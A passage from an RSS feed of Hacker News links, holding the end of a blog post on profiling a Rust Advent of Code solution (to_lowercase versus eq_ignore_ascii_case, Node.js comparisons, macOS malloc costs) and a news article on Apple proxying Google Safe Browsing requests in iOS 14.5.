solution 2: <span>6694</span>


<span>[</span> perf record: Woken up <span>1</span> times to write data <span>]</span>
<span>[</span>1<span>]</span>  + <span>27466</span> <span>done</span>       ./target/release/day-5
<span>[</span> perf record: Captured and wrote 0.002 MB perf.data <span>(</span><span>13</span> samples<span>)</span> <span>]</span>
</code></pre></div><h3 id="report">Report</h3><p>After running this multiple times,<code>perf</code> automatically aggregates the data to a report file (<code>perf.data</code>) in the same folder where we are making the call.</p><p>Now we can visualise the report with:</p><p><img src="https://raw.githubusercontent.com/cesarvr/hugo-blog/master/static/rust/perf-1.png" alt=""></p><p>Interestingly the algorithm spend <strong>30 percent</strong> of the time in the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">String::to_lowercase</a> which is suspicious:</p><div><pre><code data-lang="rust"><span>fn</span> <span>react</span>(token1: <span>&amp;</span>String, token2: <span>&amp;</span>String) -&gt; <span>bool</span> {
    <span>if</span> token1.to_lowercase() <span>=</span><span>=</span> token2.to_lowercase() {  <span>// 30% CPU wasted here
</span><span></span>        <span>return</span> token1 <span>!</span><span>=</span> token2
    }

    <span>false</span>
}
</code></pre></div><p>My first impression is that I made a mistake while running <code>perf</code> (never used it before with Rust), but everything started to make sense once I looked at the source code of the <a href="https://doc.rust-lang.org/std/string/struct.String.html#method.to_lowercase">to_lowercase</a> function.</p><p>What happen is that Rust lowercase function try to be correct in any language, so it delegates this conversion to a function called <a href="https://doc.rust-lang.org/1.29.2/std_unicode/conversions/fn.to_lower.html">std_unicode::conversions</a> this function then does a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">binary search</a> of each character against a big array (‚âà1200) of unicode characters:</p><div><pre><code data-lang="rust">
<span>const</span> to_lowercase_table: <span>&amp;</span>[(char, [char; <span>3</span>])] <span>=</span> <span>&amp;</span>[
        (<span>'\u{41}'</span>, [<span>'\u{61}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{42}'</span>, [<span>'\u{62}'</span>, <span>'\0'</span>, <span>'\0'</span>]),
        (<span>'\u{43}'</span>,<span>//...‚âà1200 ]
</span><span></span>

 <span>pub</span> <span>fn</span> <span>to_lower</span>(c: <span>char</span>) -&gt; [char; <span>3</span>] {
        <span>match</span> bsearch_case_table(c, to_lowercase_table) {
            None        <span>=</span><span>&gt;</span> [c, <span>'\0'</span>, <span>'\0'</span>],
            Some(index) <span>=</span><span>&gt;</span> to_lowercase_table[index].<span>1</span>,
        }
    }

</code></pre></div><blockquote><p>Going back at the code, this binary search is done twice per iteration now multiply this by <code>50K</code> and we found the reason for the slow down.</p></blockquote><p>After some googling I found that I should use <a href="https://doc.rust-lang.org/src/core/str/mod.rs.html#4006">eq_ignore_ascii_case</a> instead, which basically makes this operation in <a href="https://doc.rust-lang.org/1.37.0/src/core/slice/mod.rs.html#2487">linear time</a> and for one character is nearly the same as saying constant time. I recompiled the code and run the benchmarks:</p><div><pre><code data-lang="xml">Node.JS
real  0m0.374s
user  0m0.301s
sys   0m0.030s

Rust
real  0m0.283s
user  0m0.248s
sys   0m0.005s
</code></pre></div><p>Now we are talking, profiling has pay its dividends and made the Rust program <code>2.5x</code> <em>faster</em> than the original and <code>91ms</code> faster than the Javascript version, I can start celebrating and telling my friends that I‚Äôm a Rust expert now. But this leaves me with some questions:</p><blockquote><p>The <code>91ms</code> is not bad, but I wonder how much effort it will take to optimize this code to make it <code>&gt;1.5x</code> faster than the Javascript counterpart?</p></blockquote><h2 id="performance-on-macos">Performance On MacOS</h2><p>While I was thinking of this and was in the middle of unpacking my Rust stickers and preparing my laptop for some re-branding, I decided to move the code (Javascript and Rust) from my Linux VM to my main OS (<strong>MacOS Catalina</strong>), once there I gave the benchmark another try because I <em>love</em> suffering:</p><div><pre><code data-lang="sh">Node   0.17s user 0.03s system 101% cpu 0.209 total
Rust   0.23s user 0.01s system 98% cpu 0.238 total
</code></pre></div><p>After seeing this my confidence in my time measuring tool (<code>time</code>) started to fade a bit, but once I calm down and use the <a href="https://developer.apple.com/library/archive/documentation/AnalysisTools/Conceptual/instruments_help-collection/Chapter/Chapter.html">XCode Instrumentation</a> which point me in the right direction:</p><p><img src="https://github.com/cesarvr/hugo-blog/blob/master/static/rust/malloc-xcode-2.png?raw=true" alt=""></p><blockquote><p>The slowest part of the program (Rust version) is the part that does the allocation and deallocation of memory produced when calling MacOS <code>malloc</code>.</p></blockquote><p>To catch this one I'll need to dig more into Rust inner workings. Does this make it more expensive to get performance out of Rust? Did I choose the wrong abstractions? That's for another post. If you want to take a look at the code yourself here is the <a href="https://github.com/cesarvr/AOCRust/tree/master/day-5">Rust</a> and <a href="https://github.com/cesarvr/AOCRust/tree/master/JS">JS</a>, if you have any improvement, idea, suggestions or performance trick let me know by <a href="https://twitter.com/cvaldezr">Twitter</a>, <a href="https://github.com/cesarvr/AOCRust">pull request</a> or <a href="https://github.com/cesarvr/hugo-blog/issues">open an issue</a>.</p></div></div>]]>
            </description>
            <link>https://cesarvr.io/post/rust-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26111387</guid>
            <pubDate>Fri, 12 Feb 2021 07:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple redirects Google Safe Browsing traffic through proxy servers in iOS 14.5]]>
            </title>
            <description>
<![CDATA[
Score 387 | Comments 261 (<a href="https://news.ycombinator.com/item?id=26110928">thread link</a>) | @CharlesW
<br/>
February 11, 2021 | https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p><strong>Update 1:58 AM PT:</strong> <em>Updated the post to clear confusion about how Google‚Äôs Safe Browsing feature works.</em></p>
<hr>
<p>Apple‚Äôs privacy push is much more widespread than it seems at the surface. A perfect example is the new privacy feature in <a href="https://the8-bit.com/ios-14-5-changes/">iOS 14.5 Beta 1 (V2)</a> which redirects Google Safe Browsing traffic through Apple‚Äôs own proxy servers to enhance users‚Äô privacy and to not let Google see your IP address. </p>
<p>Google Safe Browsing is a security service created by Google that checks whether a website is malicious. When you access a website on the desktop version of Chrome on your Mac or PC, for instance, Google Safe Browsing checks if a website is safe to browse and displays a warning accordingly. The user ultimately has the choice, however.</p>
<p>As Reddit user u/jaydenkieran explains, Apple uses Google Safe Browsing when you enable ‚ÄúFraudulent Website Warning‚Äù within the Safari settings in the Settings app on iPhone or iPad.</p>
<p><a aria-label="According to Google (opens in a new tab)" href="https://support.google.com/transparencyreport/answer/7380435?hl=en#zippy=%2Chow-do-you-determine-that-a-site-is-unsafe" target="_blank" rel="noreferrer noopener">According to Google</a>, its Safe Browsing system works by scanning sections of Google‚Äôs web index and ‚Äúidentifying potentially compromised websites.‚Äù Then, Google tests those websites by using a virtual machine to check if the website compromises the system. If it does, it‚Äôs added to Google‚Äôs online database. Google also identifies phishing websites by using statistical models. </p>
<p><a aria-label="According to Apple (opens in a new tab)" href="https://support.apple.com/en-ae/HT210675" target="_blank" rel="noreferrer noopener">According to Apple</a>, before visiting a website, Safari may send hashed prefixes of the URL (Apple terms it ‚Äúinformation calculated from the website address‚Äù) to Google Safe Browsing to check if there‚Äôs a match. </p>
<p>Since Apple uses a hashed prefix, Google cannot learn which website the user is trying to visit. Up until iOS 14.5, Google could also see the IP address of where that request is coming from. However, since Apple now proxies Google Safe Browsing traffic, it further safeguards users‚Äô privacy while browsing using Safari.</p>
<p>Apple has been intensifying its push for privacy with iOS 14 what with the <a href="https://the8-bit.com/app-tracking-transparency-guide/">App Tracking Transparency update and the inclusion of App Privacy Reports in the App Store</a>. </p><div><p>See also</p><div id="block-wrap-45850" data-id="45850" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/siri-now-allows-setting-a-default-music-streaming-service-on-ios-14-5/" title="Siri_Default_Music_App"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg" alt="Siri Default Music App" srcset="https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2021/02/Siri_Default_Music_App-293x293.jpg 293w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>At the same time, companies like Facebook are actively opposing the Cupertino giant, accusing it of negatively affecting the advertising industry. Apple‚Äôs response has been simple: </p>
<p>‚ÄúWe believe that this is a simple matter of standing up for our users. Users should know when their data is being collected and shared across other apps and websites ‚Äî and they should have the choice to allow that or not. App Tracking Transparency in iOS 14 does not require Facebook to change its approach to tracking users and creating targeted advertising, it simply requires they give users a choice.‚Äù </p>
<p>Google itself <a href="https://appleinsider.com/articles/21/02/04/google-still-hasnt-updated-its-ios-apps-while-pondering-android-privacy-controls" target="_blank" aria-label="had been holding off (opens in a new tab)" rel="noreferrer noopener">had been holding off</a> on updating its host of apps on the App Store due to the App Privacy Health Reports in the App Store that lets users view how an app tracks them. However, Google later disclosed that it will update its apps to include as little tracking as possible.</p>
<p>Having said that, it‚Äôs interesting to see Apple focus on enhancing user privacy as much as they can. And setting up a proxy server to filter Google Safe Browsing traffic just so Google cannot see users‚Äô browsing activity will be a welcome move for a lot of users.</p>
</div><!-- .entry-content -->
</div></div>]]>
            </description>
            <link>https://the8-bit.com/apple-proxies-google-safe-browsing-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26110928</guid>
            <pubDate>Fri, 12 Feb 2021 05:07:03 GMT</pubDate>
        </item>
    </channel>
</rss>
